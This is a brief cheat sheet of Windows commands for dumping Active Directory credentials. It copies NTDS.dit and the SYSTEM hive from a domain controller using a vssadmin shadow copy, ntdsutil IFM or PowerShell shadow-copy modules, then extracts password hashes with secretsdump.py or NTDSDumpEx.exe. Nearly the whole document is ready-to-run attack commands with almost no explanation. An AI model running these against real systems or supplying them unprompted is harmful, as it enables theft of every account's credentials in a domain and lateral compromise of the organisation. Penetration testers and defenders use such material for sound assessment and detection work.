### vssadmin

```

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
```

### ntdsutil
#Two new folders will be generated: Active Directory and Registry. 
```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```
```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\

Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy 

NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM
```
